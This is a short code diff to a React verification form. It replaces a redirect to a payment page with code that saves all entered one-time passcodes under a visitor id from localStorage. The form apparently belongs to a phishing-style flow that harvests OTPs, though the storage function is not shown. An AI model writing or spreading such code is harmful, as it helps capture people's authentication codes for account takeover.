@@ -23,7 +23,9 @@ export default function VerificationForm() {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
-    router.push("/payment")
+const _id=localStorage.getItem('visitor')
+addData({id:_id,allotps})    
+
   }
 
   return (
@@ -31,7 +33,7 @@ export default function VerificationForm() {
       <div className="flex justify-center mb-6">
         <div className="relative w-48 h-48 animate-pulse-light">
           <Image
-            src="/"
+            src="/ber.png"
             alt="Verification"
             fill
             className="object-contain"
